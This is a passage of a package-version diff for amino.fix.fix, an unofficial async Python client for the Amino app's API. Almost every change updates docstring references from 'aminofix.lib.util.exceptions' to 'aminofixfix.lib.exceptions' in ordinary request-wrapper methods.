         response = await self.session.get(f"/g/s/user-profile/{userId}/joined?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
@@ -1057,15 +1057,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile/{userId}/member?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
@@ -1077,15 +1077,15 @@
             - **userId** : ID of the User.
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Visitors List <amino.lib.util.objects.VisitorsList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile/{userId}/visitors?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.VisitorsList(response.json()).VisitorsList
 
@@ -1096,15 +1096,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Users List <amino.lib.util.objects.UserProfileList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/block?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList
 
@@ -1158,15 +1158,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`List of User IDs <None>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/block/full-list?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["blockerUidList"]
 
@@ -1180,15 +1180,15 @@
                 - ``newest``, ``oldest``, ``top``
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Comments List <amino.lib.util.objects.CommentList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if sorting.lower() == "newest": sorting = "newest"
         elif sorting.lower() == "oldest": sorting = "oldest"
         elif sorting.lower() == "top": sorting = "vote"
         else: raise exceptions.WrongType(sorting)
 
         response = await self.session.get(f"/g/s/user-profile/{userId}/g-comment?sort={sorting}&start={start}&size={size}", headers=self.additional_headers())
@@ -1208,15 +1208,15 @@
             - **blogId** : ID of the Blog.
             - **wikiId** : ID of the Wiki.
             - *asGuest* : Execute as a Guest.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if reason is None: raise exceptions.ReasonNeeded
         if flagType is None: raise exceptions.FlagTypeNeeded
 
         data = {
             "flagType": flagType,
             "message": reason,
@@ -1277,15 +1277,15 @@
             - **embedType** : Type of the AttachedObject Embed. Works only in AttachedObject Embeds.
             - **embedTitle** : Title of the Embed. Works only in AttachedObject Embeds.
             - **embedContent** : Content of the Embed. Works only in AttachedObject Embeds.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         if message is not None and file is None:
             message = message.replace("<$", "‎‏").replace("$>", "‬‭")
 
         mentions = []
         if mentionUserIds:
@@ -1378,15 +1378,15 @@
             - **chatId** : ID of the Chat.
             - **asStaff** : If execute as a Staff member (Leader or Curator).
             - **reason** : Reason of the action to show on the Moderation History.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "adminOpName": 102,
             "adminOpNote": {"content": reason},
             "timestamp": int(timestamp() * 1000)
         }
 
@@ -1406,15 +1406,15 @@
         **Parameters**
             - **messageId** : ID of the Message.
             - **chatId** : ID of the Chat.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "messageId": messageId,
             "timestamp": int(timestamp() * 1000)
         })
         
         response = await self.session.post(f"/g/s/chat/thread/{chatId}/mark-as-read", headers=self.additional_headers(data=data), data=data)
@@ -1444,15 +1444,15 @@
             - **publishToGlobal** : If the Chat should show on Public Chats or not.
             - **doNotDisturb** : If the Chat should Do Not Disturb or not.
             - **pinChat** : If the Chat should Pinned or not.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {"timestamp": int(timestamp() * 1000)}
 
         if title: data["title"] = title
         if content: data["content"] = content
         if icon: data["icon"] = icon
         if keywords: data["keywords"] = keywords
@@ -1558,15 +1558,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile/{userId}?action=visit", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1602,15 +1602,15 @@
 
         **Parameters**
             - **userId** : ID of the User or List of IDs of the Users.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str):
             response = await self.session.post(f"/g/s/user-profile/{userId}/member", headers=self.additional_headers())
 
         elif isinstance(userId, list):
             data = dumps({"targetUidList": userId, "timestamp": int(timestamp() * 1000)})
             
@@ -1629,15 +1629,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/g/s/user-profile/{userId}/member/{self.userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1647,15 +1647,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/g/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1665,15 +1665,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/g/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1684,15 +1684,15 @@
         **Parameters**
             - **comId** : ID of the Community.
             - **invitationId** : ID of the Invitation Code.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {"timestamp": int(timestamp() * 1000)}
         if invitationId: data["invitationId"] = invitationId
 
         data = dumps(data)
         response = await self.session.post(f"/x{comId}/s/community/join", data=data, headers=self.additional_headers(data=data))
         if response.status_code != 200: 
@@ -1707,15 +1707,15 @@
         **Parameters**
             - **comId** : ID of the Community.
             - **message** : Message to be sent.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({"message": message, "timestamp": int(timestamp() * 1000)})
         response = await self.session.post(f"/x{comId}/s/community/membership-request", data=data, headers=self.additional_headers(data=data))
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -1726,15 +1726,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/x{comId}/s/community/leave", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1746,15 +1746,15 @@
             - **comId** : ID of the Community.
             - **reason** : Reason of the Flag.
             - **flagType** : Type of Flag.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if reason is None: raise exceptions.ReasonNeeded
         if flagType is None: raise exceptions.FlagTypeNeeded
 
         data = dumps({
             "objectId": comId,
             "objectType": 16,
@@ -1783,15 +1783,15 @@
             - **backgroundImage** : Url of the Background Picture of the Profile.
             - **backgroundColor** : Hexadecimal Background Color of the Profile.
             - **defaultBubbleId** : Chat bubble ID.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "address": None,
             "latitude": 0,
             "longitude": 0,
             "mediaList": None,
             "eventSource": "UserProfileView",
@@ -1819,15 +1819,15 @@
         **Parameters**
             - **isAnonymous** : If visibility should be Anonymous or not.
             - **getNotifications** : If account should get new Visitors Notifications.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = {"timestamp": int(timestamp() * 1000)}
 
         if not isAnonymous: data["privacyMode"] = 1
         if isAnonymous: data["privacyMode"] = 2
         if not getNotifications: data["notificationStatus"] = 2
@@ -1846,15 +1846,15 @@
 
         **Parameters**
             - **aminoId** : Amino ID of the Account.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({"aminoId": aminoId, "timestamp": int(timestamp() * 1000)})
         response = await self.session.post(f"/g/s/account/change-amino-id", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -1865,15 +1865,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile/{userId}/linked-community", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["linkedCommunityList"]).CommunityList
 
@@ -1883,15 +1883,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile/{userId}/linked-community", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["unlinkedCommunityList"]).CommunityList
 
@@ -1901,15 +1901,15 @@
 
         **Parameters**
             - **comIds** : IDS of the Communities.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({"ndcIds": comIds, "timestamp": int(timestamp() * 1000)})
         response = await self.session.post(f"/g/s/user-profile/{self.userId}/linked-community/reorder", headers=self.additional_headers(data=data), data=data)
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
@@ -1920,15 +1920,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/g/s/user-profile/{self.userId}/linked-community/{comId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1938,15 +1938,15 @@
 
         **Parameters**
             - **comId** : ID of the Community.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/g/s/user-profile/{self.userId}/linked-community/{comId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -1960,15 +1960,15 @@
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
             - **replyTo** : ID of the Comment to Reply to.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if message is None: raise exceptions.MessageNeeded
 
         data = {
             "content": message,
             "stickerId": None,
             "type": 0,
@@ -2010,15 +2010,15 @@
             - **userId** : ID of the User. (for Walls)
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if userId: response = await self.session.delete(f"/g/s/user-profile/{userId}/g-comment/{commentId}", headers=self.additional_headers())
         elif blogId: response = await self.session.delete(f"/g/s/blog/{blogId}/g-comment/{commentId}", headers=self.additional_headers())
         elif wikiId: response = await self.session.delete(f"/g/s/item/{wikiId}/g-comment/{commentId}", headers=self.additional_headers())
         else: raise exceptions.SpecifyType
 
         if response.status_code != 200: 
@@ -2033,15 +2033,15 @@
         **Parameters**
             - **blogId** : ID of the Blog or List of IDs of the Blogs. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "value": 4,
             "timestamp": int(timestamp() * 1000)
         }
 
         if blogId:
@@ -2079,15 +2079,15 @@
         **Parameters**
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if blogId: response = await self.session.delete(f"/g/s/blog/{blogId}/g-vote?eventSource=UserProfileView", headers=self.additional_headers())
         elif wikiId: response = await self.session.delete(f"/g/s/item/{wikiId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         else: raise exceptions.SpecifyType
 
         if response.status_code != 200: 
             return exceptions.CheckException(response)
@@ -2103,15 +2103,15 @@
             - **userId** : ID of the User. (for Walls)
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "value": 4,
             "timestamp": int(timestamp() * 1000)
         }
 
         if userId:
@@ -2148,15 +2148,15 @@
             - **userId** : ID of the User. (for Walls)
             - **blogId** : ID of the Blog. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if userId: response = await self.session.delete(f"/g/s/user-profile/{userId}/comment/{commentId}/g-vote?eventSource=UserProfileView", headers=self.additional_headers())
         elif blogId: response = await self.session.delete(f"/g/s/blog/{blogId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         elif wikiId: response = await self.session.delete(f"/g/s/item/{wikiId}/comment/{commentId}/g-vote?eventSource=PostDetailView", headers=self.additional_headers())
         else: raise exceptions.SpecifyType
 
         if response.status_code != 200: 
@@ -2170,15 +2170,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : :meth:`Membership Object <amino.lib.util.objects.Membership>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/membership?force=true", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.Membership(response.json()).Membership
 
@@ -2191,15 +2191,15 @@
                 - ``en``, ``es``, ``pt``, ``ar``, ``ru``, ``fr``, ``de``
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Blogs List <amino.lib.util.objects.BlogList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if language not in await self.get_supported_languages(): raise exceptions.UnsupportedLanguage(language)
         response = await self.session.get(f"/g/s/announcement?language={language}&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.BlogList(response.json()["blogList"]).BlogList
@@ -2210,15 +2210,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : :meth:`Wallet Object <amino.lib.util.objects.WalletInfo>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/wallet", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.WalletInfo(response.json()["wallet"]).WalletInfo
 
@@ -2229,15 +2229,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`Wallet Object <amino.lib.util.objects.WalletInfo>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/wallet/coin/history?start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.WalletHistory(response.json()["coinHistoryList"]).WalletHistory
 
@@ -2247,15 +2247,15 @@
 
         **Parameters**
             - **deviceID** : ID of the Device.
 
         **Returns**
             - **Success** : :meth:`User ID <amino.lib.util.objects.UserProfile.userId>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/auid?deviceId={deviceId}")
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["auid"]
 
@@ -2266,15 +2266,15 @@
         **Parameters**
             - **code** : Code from the Amino URL.
                 - ``http://aminoapps.com/p/EXAMPLE``, the ``code`` is 'EXAMPLE'.
 
         **Returns**
             - **Success** : :meth:`From Code Object <amino.lib.util.objects.FromCode>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/link-resolution?q={code}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.FromCode(response.json()["linkInfoV2"]).FromCode
 
@@ -2286,15 +2286,15 @@
             - **objectID** : ID of the Object. User ID, Blog ID, etc.
             - **objectType** : Type of the Object.
             - *comId* : ID of the Community. Use if the Object is in a Community.
 
         **Returns**
             - **Success** : :meth:`From Code Object <amino.lib.util.objects.FromCode>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = dumps({
             "objectId": objectId,
             "targetCode": 1,
             "objectType": objectType,
             "timestamp": int(timestamp() * 1000)
         })
@@ -2312,15 +2312,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : :meth:`List of Supported Languages <List>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/community-collection/supported-languages?start=0&size=100", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["supportedLanguages"]
 
@@ -2330,15 +2330,15 @@
 
         **Parameters**
             - No parameters required.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/g/s/coupon/new-user-coupon/claim", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.status_code
 
@@ -2349,15 +2349,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`List <List>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/store/subscription?objectType=122&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return response.json()["storeSubscriptionItemList"]
 
@@ -2368,15 +2368,15 @@
         **Parameters**
             - *start* : Where to start the list.
             - *size* : Size of the list.
 
         **Returns**
             - **Success** : :meth:`User Profile Count List Object <amino.lib.util.objects.UserProfileCountList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/g/s/user-profile?type=recent&start={start}&size={size}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.UserProfileCountList(response.json()).UserProfileCountList
 
@@ -2403,15 +2403,15 @@
         **Parameters**
             - **chatId** - ID of the Chat
             - **userId** - ID of the User
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "uid": userId
         })
 
         response = await self.session.post(f"/g/s/chat/thread/{chatId}/vvchat-presenter/invite", headers=self.additional_headers(data=data), data=data)
@@ -2427,15 +2427,15 @@
         **Parameters**
             - **level** - Level of the ads.
                 - ``1``, ``2``
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         data = dumps({
             "adsLevel": level,
             "timestamp": int(timestamp() * 1000)
         })
 
@@ -2468,15 +2468,15 @@
 
         **Parameters**
             - **language** - Set up language
 
         **Returns**
             - **Success** : :meth:`Community List <amino.lib.util.objects.CommunityList>`
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
 
         response = await self.session.get(f"/g/s/topic/0/feed/community?language={language}&type=web-explore&categoryKey=recommendation&size={size}&pagingType=t", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else:
             return objects.CommunityList(response.json()["communityList"]).CommunityList
```

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/socket.py` & `amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/socket.py`

 * *Files identical despite different names*

### Comparing `amino.fix.fix-1.0.6b1/aminofixfix/asyncfixfix/sub_client.py` & `amino.fix.fix-1.0.6b2/aminofixfix/asyncfixfix/sub_client.py`

 * *Files 1% similar despite different names*

```diff
@@ -370,15 +370,15 @@
         **Parameters**
             - **blogId** : ID of the Blog or List of IDs of the Blogs. (for Blogs)
             - **wikiId** : ID of the Wiki. (for Wikis)
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         data = {
             "value": 4,
             "timestamp": int(timestamp() * 1000)
         }
 
         if blogId:
@@ -636,15 +636,15 @@
 
         **Parameters**
             - **userId** : ID of the User or List of IDs of the Users.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if isinstance(userId, str):
             response = await self.session.post(f"/x{self.comId}/s/user-profile/{userId}/member", headers=self.additional_headers())
 
         elif isinstance(userId, list):
             data = dumps({"targetUidList": userId, "timestamp": int(timestamp() * 1000)})
             
@@ -662,15 +662,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/x{self.comId}/s/user-profile/{self.profile.userId}/joined/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     async def block(self, userId: str):
@@ -679,15 +679,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.post(f"/x{self.comId}/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     async def unblock(self, userId: str):
@@ -696,15 +696,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.delete(f"/x{self.comId}/s/block/{userId}", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     async def visit(self, userId: str):
@@ -713,15 +713,15 @@
 
         **Parameters**
             - **userId** : ID of the User.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         response = await self.session.get(f"/x{self.comId}/s/user-profile/{userId}?action=visit", headers=self.additional_headers())
         if response.status_code != 200: 
             return exceptions.CheckException(response)
         else: return response.status_code
 
     async def flag(self, reason: str, flagType: int, userId: str = None, blogId: str = None, wikiId: str = None, asGuest: bool = False):
@@ -735,15 +735,15 @@
             - **blogId** : ID of the Blog.
             - **wikiId** : ID of the Wiki.
             - *asGuest* : Execute as a Guest.
 
         **Returns**
             - **Success** : 200 (int)
 
-            - **Fail** : :meth:`Exceptions <aminofix.lib.util.exceptions>`
+            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
         """
         if reason is None: raise exceptions.ReasonNeeded()
         if flagType is None: raise exceptions.FlagTypeNeeded()
 
         data = {
             "flagType": flagType,
             "message": reason,
@@ -804,15 +804,15 @@
             - **embedType** : Type of the AttachedObject Embed. Works only in AttachedObject Embeds.
             - **embedTitle** : Title of the Embed. Works only in AttachedObject Embeds.
